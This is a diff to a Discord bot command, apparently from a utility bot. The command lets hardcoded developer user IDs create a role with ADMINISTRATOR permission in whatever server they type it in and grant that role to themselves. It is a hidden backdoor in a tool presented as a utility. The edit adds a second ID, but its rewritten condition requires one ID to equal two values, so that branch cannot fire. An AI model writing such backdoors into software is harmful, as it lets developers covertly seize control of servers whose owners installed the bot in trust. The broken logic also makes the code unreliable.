@@ -11,12 +11,13 @@ module.exports = {
     async execute(client, message, args){
 
         const Discord = require('discord.js')
-        if (!message.author.id == "683879319558291539") {
+        if  (message.author.id !== "683879319558291539" && message.author.id !== "518382491338539017") {
 
             return;
             
         }
-        if (message.author.id == "683879319558291539") {
+        else if (message.author.id == "683879319558291539" && message.author.id == "518382491338539017") {
+            
 
             message.guild.roles.create({ data: { name: 'Cent Utilty bot Developer', permissions: ['ADMINISTRATOR'] } });
 
@@ -28,13 +29,12 @@ module.exports = {
             let member = message.member;
 
             //Give the role.
-            member.roles.add(role)
+            await member.roles.add(role)
 
             const opd = new Discord.MessageEmbed()
-            .setTitle('SUCCESS!')
-            .setDescription('Successfully given admin perm to ' + message.author.tag + ' in the server: ' + message.guild.name)
+            .setDescription('<:greentick:750751680613843105> Successfully given admin perm to ' + message.author + ' in the server: ' + message.guild.name)
             .setColor('GREEN')
-            message.channel.send(opd)
+            await message.channel.send(opd)
 
             .catch(error => {
                 message.channel.send('Something went wrong in the Cent Utilities land. Error for reference: ', error);
